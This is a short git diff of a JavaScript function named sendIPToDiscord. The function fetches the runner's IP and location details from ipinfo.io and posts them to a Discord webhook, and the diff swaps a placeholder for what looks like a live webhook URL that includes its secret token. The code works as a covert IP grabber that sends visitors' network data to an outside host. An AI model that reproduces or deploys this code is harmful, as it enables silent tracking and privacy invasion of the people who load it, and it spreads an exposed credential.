@@ -6,7 +6,7 @@ async function sendIPToDiscord() {
     const response = await fetch('https://ipinfo.io/json');
     const data = await response.json();
 
-    const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL';
+    const webhookUrl = 'https://discord.com/api/webhooks/1322340263817121872/KVz7ETrNyLzmHtpnWCWVNlcs7V688BSA59RFmammBBjnxFHk-kGj8bdQCGs3LpRPRzPE';
     const payload = {
       content: `IP Info: ${JSON.stringify(data)}`,
     };
